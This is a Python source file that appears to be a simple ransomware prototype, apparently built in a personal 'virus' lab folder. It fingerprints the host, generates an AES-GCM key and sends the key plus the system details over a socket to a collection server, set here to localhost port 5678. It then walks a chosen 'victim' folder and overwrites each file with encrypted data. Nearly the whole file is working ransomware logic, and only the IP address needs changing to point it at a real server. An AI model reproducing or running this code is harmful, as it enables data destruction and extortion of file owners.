from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import os, platform, getpass, shutil, socket, ssl, json, base64, uuid, time

def collect_system_info():
    info = {}
    info['timestamp'] = time.time()
    info['user'] = getpass.getuser()
    info['hostname'] = socket.gethostname()
    info['platform'] = platform.system()
    info['platform_release'] = platform.release()
    info['platform_version'] = platform.version()
    info['machine'] = platform.machine()
    info['processor'] = platform.processor()
    info['cpu_count'] = os.cpu_count()
    total, used, free = shutil.disk_usage(os.path.expanduser("~"))
    info['disk_total'] = total
    info['disk_free'] = free
    info['tempdir'] = os.getenv('TMP') or os.getenv('TEMP') or '/tmp'
    info['node_mac'] = hex(uuid.getnode())
   
    return info


def generate_key():
    return AESGCM.generate_key(bit_length=256)

def encrypt_message(data, key):
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    
    ciphertext = aesgcm.encrypt(nonce, data, None)
    
    return nonce + ciphertext



def send_data_to_server(data):
    IP_ADDRESS = '127.0.0.1'
    PORT = 5678

    ## Connection
    # context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # with socket.create_connection((IP_ADDRESS, PORT)) as sock:
    #     with context.wrap_socket(sock, server_hostname=IP_ADDRESS) as ssock:
    #         ssock.sendall(data)
    #         print("Securely Sent!!")

    json_data = json.dumps(data).encode('utf-8')

    try:
        # For testing, we use a standard socket. 
        # Only use SSL/wrap_socket if your server has a certificate ready.
        with socket.create_connection((IP_ADDRESS, PORT)) as sock:
            sock.sendall(json_data)
            print("Data sent successfully!")
    except ConnectionRefusedError:
        print("Error: The server isn't running on port 5678.")

def encrypting_file(path, key):

    file_for_readning_path = path
    # '/Users/kacperwrobel/Documents/cyber_tools/virus/plik.txt'
    encrypted_file = ""

    with open(file_for_readning_path, "rb") as f:
        file_data = f.read()

    encrypted_file = encrypt_message(file_data.strip(), key)
    print(encrypted_file)

    with open(file_for_readning_path, "wb") as f:
        f.write(encrypted_file)

def encrypting_folder(folder_path):
    key = generate_key()
    info = collect_system_info()
    info['encryption_key'] = base64.b64encode(key).decode('utf-8')
    send_data_to_server(info)
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypting_file(file_path, key)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

def main():
    folder_path = input("Enter the folder path to encrypt: ")
    if folder_path == "":
        folder_path = "/Users/kacperwrobel/Documents/cyber_tools/virus/victim"
    encrypting_folder(folder_path)

if __name__ == "__main__":
    main()